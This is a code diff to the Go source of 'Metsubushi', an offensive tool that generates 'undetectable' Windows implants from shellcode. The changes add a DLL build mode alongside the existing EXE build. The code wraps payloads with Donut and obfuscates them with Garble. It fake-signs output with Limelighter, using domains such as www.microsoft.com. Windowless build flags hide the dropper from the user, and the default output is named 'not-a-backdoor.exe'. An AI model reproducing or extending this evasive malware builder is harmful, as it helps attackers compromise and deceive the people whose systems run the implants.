@@ -2,7 +2,12 @@
  * Metsubushi
  * by Red Skal
  *
- * Generates Go-based implants from a given template and shellcode.
+ * Go-based framework for generating undetectable implants.
+ * Makes use of Tylous/Optiv Limelighter project, and Awgh's port of Donut.
+ *
+ * 15/11/2021 - version 0.2a updates:
+ *      - Added DLL build option
+ *      - Moved Limelighter to github to make things more modular (couldn't import from Optiv's github)
  */
 
 package main
@@ -17,7 +22,6 @@ import (
 	"io"
 	"io/ioutil"
 	"log"
-	"metsubushi/limelighter"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -25,6 +29,12 @@ import (
 	"strings"
 
 	"github.com/Binject/go-donut/donut"
+	"github.com/redskal/limelighter"
+)
+
+const (
+	EXE_BUILD = iota // 0
+	DLL_BUILD        // 1
 )
 
 var bannerAscii string = `
@@ -201,7 +211,7 @@ func generateHexVar(src []byte) []byte {
 	return []byte(buff.String())
 }
 
-func compile(projectDirectory, projectName, arch string, useGarble bool) error {
+func compile(projectDirectory, projectName, arch string, useGarble bool, buildType int) error {
 
 	err := os.Chdir(projectDirectory)
 	if err != nil {
@@ -250,10 +260,21 @@ func compile(projectDirectory, projectName, arch string, useGarble bool) error {
 		return err
 	}
 
-	// arch is pre-sanitised so there should be no chance of error with this method.
-	projectArch := "GOARCH=" + arch
+	buildFlags := "-ldflags=-s -w -H=windowsgui"
+	buildEnvs := "GOOS=windows GOARCH=" + arch
+	switch buildType {
+	case DLL_BUILD:
+		// DLL build
+		buildFlags = buildFlags + " -buildmode=c-shared"
+		buildEnvs = buildEnvs + " CGO_ENABLED=1"
+	case EXE_BUILD:
+		// EXE build
+	default:
+		// EXE build - nothing else needed.
+	}
+
 	// the Go build flags are to hide the droppers window from the user. (Akin to using WinMain() in C)
-	cmd, err = exec.Command(envBinary, "GOOS=windows", projectArch, goBinary, "build", "-ldflags=-s -w -H=windowsgui").Output()
+	cmd, err = exec.Command(envBinary, buildEnvs, goBinary, "build", buildFlags).Output()
 	if err != nil {
 		fmt.Println("[!] Error compiling Go file.")
 		return err
@@ -282,12 +303,14 @@ func main() {
 
 	var payloadFile, templateFile, outFile, arch, donutArgs, signImplant string
 	var helpRequired, startQuiet, useGarble bool
+	var buildType int
 	flag.StringVar(&payloadFile, "p", "", "Windows binary or raw shellcode file. (Use -d with Windows binaries to generate Donut shellcode).")
 	flag.StringVar(&templateFile, "t", "basic.go", "Name of the template to use.")
 	flag.StringVar(&outFile, "o", "not-a-backdoor.exe", "Filename of the generated implant binary.")
 	flag.StringVar(&arch, "a", "x64", "Architecture to compile for. 'x64' or 'x86'.")
 	flag.StringVar(&donutArgs, "d", "unused", "Use Donut to generate shellcode from a Windows binary.")
 	flag.StringVar(&signImplant, "s", "", "Sign implant using Limelighter. Provide a domain. Eg. www.microsoft.com")
+	flag.IntVar(&buildType, "b", 0, "Build type: 0 - EXE, 1 - DLL. Default is EXE")
 	flag.BoolVar(&helpRequired, "help", false, "This help menu.")
 	flag.BoolVar(&startQuiet, "q", false, "Start without showing the secksual ASCII artwork.")
 	flag.BoolVar(&useGarble, "g", false, "Use Garble to obfuscate the generated implant.")
@@ -396,7 +419,7 @@ func main() {
 		compilerName = "Go compiler"
 	}
 	fmt.Printf("[+] Using %s to build: %s\n", compilerName, outputFile)
-	compile := compile(outputDirectory, fileNameWithoutExt, arch, useGarble)
+	compile := compile(outputDirectory, fileNameWithoutExt, arch, useGarble, buildType)
 	if compile != nil {
 		fmt.Println("[!] Error compiling file")
 		return
